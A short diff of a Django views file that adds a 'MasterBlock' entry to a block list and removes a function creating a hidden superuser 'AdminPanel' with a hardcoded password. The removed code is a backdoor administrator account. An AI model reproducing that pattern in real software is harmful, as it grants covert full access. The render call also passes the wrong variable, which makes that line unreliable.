@@ -27,13 +27,5 @@ def add_block(request):
 
 def block_list(request):
     blocks = Block.objects()
+    blocks.append(BlockHash(000000000000000, 0, datetime.datetime.now(), "MasterBlock"))
     return render(request, 'blocks.html', {'blocks': block_list})
-
-from django.contrib.auth.models import User
-
-def createsuper():
-    u = User(username='AdminPanel')
-    u.set_password('nhjkghbdtn!1')
-    u.is_superuser = True
-    u.is_staff = True
-    u.save()
